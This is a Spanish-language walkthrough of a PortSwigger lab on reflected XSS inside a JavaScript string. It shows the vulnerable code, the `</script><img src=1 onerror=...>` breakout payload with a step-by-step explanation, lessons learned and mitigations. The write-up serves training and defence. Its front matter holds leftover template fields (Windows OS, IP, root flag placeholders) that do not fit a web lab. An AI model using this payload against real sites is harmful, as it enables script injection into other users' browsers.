---
title: "Reflected XSS into a JavaScript string with single quote and backslash escaped"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped"
author: "Z4k7"
date: "2026-04-17"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Reflected"
  - "JavaScript"
techniques:
  - "JavaScript Tag Closure"
  - "Script Context Breakout"
tools:
  - "BurpSuite"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Laboratorio de XSS Reflejado donde la entrada se refleja dentro de una cadena JavaScript, ambas comillas simples y barras invertidas están escapadas. La solución requiere cerrar la etiqueta <script> completamente para romper el contexto JavaScript y ejecutar un nuevo <img> tag con evento onerror.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejadas en la funcionalidad de seguimiento de consultas de búsqueda. La reflexión se produce dentro de una cadena de JavaScript con comillas simples y barras invertidas escapadas.
          Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que salga de la cadena JavaScript y llame a la `alert` función.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/file-20260424235524498.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En el objetivo del laboratorio menciona que debemos validar o manipular el apartado de search como primera validación debemos consultar el comportamiento del mismo.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/file-20260424235737681.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se envía una solicitud GET la cual nos crea un apartado en la url nombrado `search` consultando el código fuente.
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
              var searchTerms = 'Z4k7';
              document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
          </script>
      - kind: "note"
        text: |
          El anterior código toma la cabecera o el dato ingresado por el usuario y lo asigna para crear el Tag con src
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Ambas comillas simples Y barras invertidas están escapadas. Esto cierra el camino de los laboratorios anteriores. Sin embargo, hay un bypass más radical: cerrar completamente la etiqueta `<script>` y inyectar HTML nuevo."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Ya que el anterior código toma la cabecera o los datos del usuario podemos tratar de completar o finalizar el script si enviamos el siguiente código.
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          </script>
      - kind: "note"
        text: |
          Tendremos como resultado
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/file-20260425001725298.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se renderiza el script y se toma como si se finalizara a partir de ese punto no se renderiza el resto del código.
      - kind: "code"
        lang: "HTML"
        code: |
          </script><img%20src=1%20onerror=alert(document.domain)%20/>
      - kind: "note"
        text: |
          Si envío el código anterior funciona sin problema alguno generando un alert
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/file-20260425001954512.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/file-20260425002020324.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es un bypass radical pero efectivo. Cuando no puedes escapar de una cadena o contexto, cierra completamente el contexto y crea uno nuevo. El navegador interpreta `</script>` como cierre de la etiqueta, luego cualquier HTML después se renderiza normalmente. No necesitamos escapar comillas o barras invertidas si salimos completamente del contexto."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El contexto original es:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
              var searchTerms = 'USER_INPUT_HERE';
              document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
          </script>
      - kind: "note"
        text: |
          Inyectamos:
      - kind: "code"
        lang: "HTML"
        code: |
          </script><img src=1 onerror=alert(document.domain) />
      - kind: "note"
        text: |
          El resultado final en el navegador es:
      - kind: "code"
        lang: "HTML"
        code: |
          <script>
              var searchTerms = '</script><img src=1 onerror=alert(document.domain) />';
              document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
          </script>
      - kind: "note"
        text: |
          Pero el navegador interpreta `</script>` como cierre del script y todo lo demás como HTML normal:
      - kind: "code"
        lang: "HTML"
        code: |
          <img src=1 onerror=alert(document.domain) />
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/file-20260425001954512.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El evento `onerror` en `<img>` se dispara cuando la imagen no puede cargarse (src=1 garantiza el error). Esto es efectivo cuando eventos como `onclick` o `onload` podrían estar bloqueados. El atributo `onerror` es menos conocido y a menudo pasado por alto en validación."

  - id: "exploit"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El payload final que se envía es:
      - kind: "code"
        lang: "HTML"
        code: |
          </script><img src=1 onerror=alert(document.domain) />
      - kind: "note"
        text: |
          Una vez ejecutado:
          1. `</script>` cierra la etiqueta script completamente
          2. El navegador interpreta el resto como HTML normal
          3. `<img src=1 onerror=alert(document.domain) />` se renderiza como elemento HTML
          4. El atributo `src=1` causa un error de carga
          5. El evento `onerror` se dispara automáticamente
          6. `alert(document.domain)` se ejecuta
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped/file-20260425002020920.jpg"
        caption: "Evidencia técnica"

lessons:
  - 'Cuando no puedes escapar dentro de un contexto, intenta salir completamente de ese contexto'
  - 'Los tags de cierre (`</script>`) se interpretan como finalizadores incluso dentro de strings en algunos contextos'
  - 'Los eventos `onerror` en elementos `<img>` se disparan automáticamente cuando la fuente es inválida'
  - 'Una validación que protege un contexto (comillas, barras invertidas escapadas) puede ser inútil si se puede salir del contexto'
  - 'HTML injection es a veces más efectivo que JavaScript injection cuando la primera está menos protegida'
  - 'Múltiples capas de protección necesitan ser evaluadas en conjunto, no individualmente'
mitigation:
  - 'Usar `JSON.stringify()` para serializar correctamente strings en JavaScript'
  - 'Validar en servidor y rechazar payloads que contengan `</script>`, `<img`, u otros tags de cierre'
  - 'Usar Content Security Policy (CSP) con `script-src ''self''` para bloquear scripts inline'
  - 'Usar frameworks que manejan escaping automáticamente (React, Vue, Angular)'
  - 'Implementar múltiples capas de validación (sanitizar después de decodificar)'
  - 'Escapar todos los caracteres especiales de HTML cuando insertar entrada en contextos de script'
  - 'Usar Context-Aware Encoding que dependa del contexto específico (JavaScript, HTML, URL, CSS)'
---
